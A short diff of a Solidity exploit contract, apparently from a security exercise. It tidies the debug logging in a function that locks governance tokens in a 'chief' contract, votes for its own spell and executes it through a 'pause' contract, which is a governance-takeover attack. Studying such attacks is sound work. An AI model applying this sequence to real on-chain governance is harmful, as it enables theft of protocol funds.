@@ -26,13 +26,11 @@ contract Action {
     function cook(address _cgt, uint256 amount, uint256 wethMin, uint256 daiMin) external onlyPans {
         IERC20 cgt = IERC20(_cgt);
         cgt.transferFrom(msg.sender, address(this), amount);
-        console.log("Balance of CGT");
-        console.log("Before the attack: %s", cgt.balanceOf(address(this)));
 
         cgt.approve(address(chief), amount);
 
         chief.lock(amount);
-        console.log("After locking in chief: %s", cgt.balanceOf(address(this)));
+        console.log("CGT Balance after locking in chief: %s", cgt.balanceOf(address(this)));
 
         address[] memory _yays = new address[](1);
         _yays[0] = address(this);
@@ -51,8 +49,6 @@ contract Action {
 
         pause.plot(spellAddr, tag, funcSig, delay);
         pause.exec(spellAddr, tag, funcSig, delay);
-
-        console.log("End of attack: %s", cgt.balanceOf(address(this)));
     }
 }
 
